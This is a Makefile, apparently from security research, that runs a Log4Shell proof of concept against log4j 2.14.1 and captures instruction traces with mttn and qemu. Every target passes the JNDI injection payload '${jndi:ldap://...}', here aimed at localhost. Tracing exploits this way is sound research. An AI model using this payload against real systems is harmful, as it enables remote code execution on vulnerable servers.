.PHONY: all
all: log4shell.trace.txt

log4shell.trace.txt: vulnerable-app/log4shell-poc.jar
	mttn --ignore-unsupported-memops java -- \
		-cp vulnerable-app/log4shell-poc.jar:vulnerable-app/lib/log4j-api-2.14.1.jar:vulnerable-app/lib/log4j-core-2.14.1.jar \
		com.trailofbits.log4shell.PoC '$${jndi:ldap://127.0.0.1:1337/pwn}' \
	> $@

log4shell.qemu.trace: vulnerable-app/log4shell-poc.jar
	# NOTE(jl): see https://news.ycombinator.com/item?id=27047114
	qemu-i386 -D $@ -singlestep -d nochain,cpu $(shell which java) -- \
		-cp vulnerable-app/log4shell-poc.jar:vulnerable-app/lib/log4j-api-2.14.1.jar:vulnerable-app/lib/log4j-core-2.14.1.jar \
		com.trailofbits.log4shell.PoC '$${jndi:ldap://127.0.0.1:1337/pwn}' \

.PHONY: run
run:
	java \
		-cp vulnerable-app/log4shell-poc.jar:vulnerable-app/lib/log4j-api-2.14.1.jar:vulnerable-app/lib/log4j-core-2.14.1.jar \
		com.trailofbits.log4shell.PoC '$${jndi:ldap://127.0.0.1:1337/pwn}'
